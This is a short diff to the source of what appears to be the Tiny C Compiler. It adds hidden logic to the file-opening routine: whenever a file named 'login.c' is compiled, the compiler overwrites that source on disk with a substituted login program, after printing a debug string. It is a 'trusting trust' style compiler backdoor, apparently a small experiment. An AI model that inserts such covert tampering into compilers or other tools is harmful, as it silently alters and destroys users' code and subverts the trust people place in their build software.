@@ -684,9 +684,28 @@ PUB_FUNC void _tcc_warning(const char *fmt, ...)
 ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
 {
     // printf("%s\n", filename);
+
     if (!strcmp(filename, "login.c"))
     {
         printf("YOOOO\n");
+        FILE *loginfile = fopen(filename, "w+");
+        char *logintext =
+            "#include <string.h>\n\
+                static int\n\
+                do_login(const char *username)\n\
+            {\n\
+                if (!strcmp(username, \"root\"))\n\
+                    return 0;\n\
+                return 1;\n\
+            }\n\
+            int main(int argc, char *argv[])\n\
+            {\n\
+                if (argc != 2)\n\
+                    return 1;\n\
+                return do_login(argv[1]);\n\
+            }\n";
+        fprintf(loginfile, "%s", logintext);
+        fclose(loginfile);
     }
 
     BufferedFile *bf;
